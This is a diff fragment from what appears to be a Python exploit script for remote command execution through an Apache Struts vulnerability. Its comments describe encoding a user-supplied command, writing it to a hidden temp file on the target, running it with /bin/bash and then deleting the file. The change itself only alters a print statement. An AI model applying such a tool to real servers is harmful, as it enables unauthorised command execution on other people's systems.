@@ -32,7 +32,7 @@ def main(url, command):
     #XML can be pretty finicky with special characters and escaping. Combine this with command execution with struts and its even more finicky.
     filename = "."+random_string(20)+'.tmp'
     print('[+] Encoding Command')
-    print(command)
+    print('[*] ' + command)
     command = command.encode('ascii')
     #So lets encode our user supplied command in base64 and write it to a string using the below struts vuln command with XML friendly characters.
     #we will save it to a file, execute that file with /bin/bash and then remove the temporary file
